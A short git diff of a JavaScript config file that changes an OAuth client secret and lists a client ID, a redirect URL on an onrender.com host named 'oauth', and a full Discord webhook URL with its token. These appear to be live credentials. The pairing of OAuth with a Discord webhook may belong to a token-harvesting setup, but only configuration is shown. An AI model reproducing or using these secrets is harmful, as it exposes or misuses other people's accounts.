@@ -1,5 +1,5 @@
 //Config
-const client_secret = 'thj8Q~C1xEzGzUw-d6kcockrxQezUhmqvhRNycKZ'
+const client_secret = '6055b3af-dd4e-457e-9f1c-d01bb2f59326'
 const client_id = '8daafb9d-a3fd-45d3-ba89-8f0f09cd1418'
 const redirect_uri = 'https://oauth-898h.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1208420562746220635/mqDyfnhidPnP0ZBItyz9e89aAlF58RsWO558BajRY5UYkwLiykglAY1dfkOuLf9U80Tn'
